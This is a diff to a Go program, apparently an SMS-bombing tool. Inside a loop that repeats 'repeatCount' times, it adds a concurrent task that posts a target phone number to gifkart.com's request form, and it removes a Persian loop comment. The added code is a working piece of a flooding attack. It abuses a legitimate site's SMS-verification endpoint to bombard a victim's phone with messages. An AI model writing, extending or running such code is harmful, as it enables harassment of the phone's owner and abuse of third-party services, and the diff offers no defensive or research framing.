@@ -328,9 +328,15 @@ func main() {
 	for i := 0; i < repeatCount; i++ {
         
 
+			// gifkart.com (SMS - POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("PhoneNumber", phone) 
+				sendFormRequest(ctx, "https://gifkart.com/request/", formData, &wg, ch)
+			}
 
-
-	} // --- پایان حلقه اصلی برای اضافه کردن وظایف ---
+	} 
 
 
 	close(tasks)
